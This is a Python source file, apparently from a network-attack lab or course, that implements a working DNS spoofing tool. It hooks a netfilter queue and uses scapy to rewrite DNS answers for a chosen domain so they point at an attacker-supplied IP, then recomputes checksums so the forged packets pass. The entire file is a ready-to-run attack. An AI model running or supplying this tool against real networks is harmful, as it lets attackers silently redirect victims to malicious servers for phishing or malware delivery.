#!/usr/bin/env python
import argparse
import netfilterqueue
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if bytes(options.host.encode()) in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(
                rrname=qname,
                rdata=options.target
            )
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1  # fake amount of DNS RR records
            # Remove layers, so Scapy re-calculates these to validp
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


parser = argparse.ArgumentParser()
parser.add_argument("--host", dest="host", help="Host to fake", default="jurikolo.name")
parser.add_argument("-t", "--target", dest="target", help="Target IP address", default="172.16.43.130")
parser.add_argument("-d", "--debug", dest="debug", help="Debug", default=False)
options = parser.parse_args()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
